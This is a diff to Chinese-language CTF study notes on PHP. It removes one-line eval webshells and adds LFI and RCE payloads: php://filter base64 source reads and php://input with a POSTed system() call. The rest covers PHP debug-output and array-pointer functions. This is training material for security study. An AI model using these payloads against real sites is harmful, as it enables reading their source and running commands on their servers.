@@ -2,16 +2,10 @@
 tags:
   - 实用
   - CTF
+  - PHP
 ---
 
-### 一句话木马
-```php
-eval($_GET["cmd"]);
-eval($_POST["cmd"]);
-eval($_REQUEST['cmd']);
-```
 
----
 ### 打印调试输出
 
 | 对比维度          | `echo`                                 | `print_r()`                        | `var_dump()`                      |
@@ -151,3 +145,26 @@ pos(localeconv())
 | `reset()`   | 将指针重置到数组**第一个**元素，并返回其值  | 第一个元素的值，空数组返回 `false`        |
 | `end()`     | 将指针移动到数组**最后一个**元素，并返回其值 | 最后一个元素的值，空数组返回 `false`       |
 | `each()`    | 返回当前元素的键值对，并将指针前移一位      | 数组（PHP 7.2 起已废弃，PHP 8.0 起移除） |
+
+---
+
+## php 伪协议
+
+### 带编码地读取文件
+```
+?file=php://filter/read=convert.base64-encode/resource=index.php
+```
+
+### 用 `php://input` 来RCE
+原理是 `php://input` 这个协议会从POST请求读取数据，而 `inlcude` 会执行 PHP 代码。
+```
+?url=php://input
+```
+然后 POST 的 body
+```
+<?php system("ls"); ?>
+```
+
+> 远程服务器 `include("php://input")`
+> 与 Content-Type 无关
+
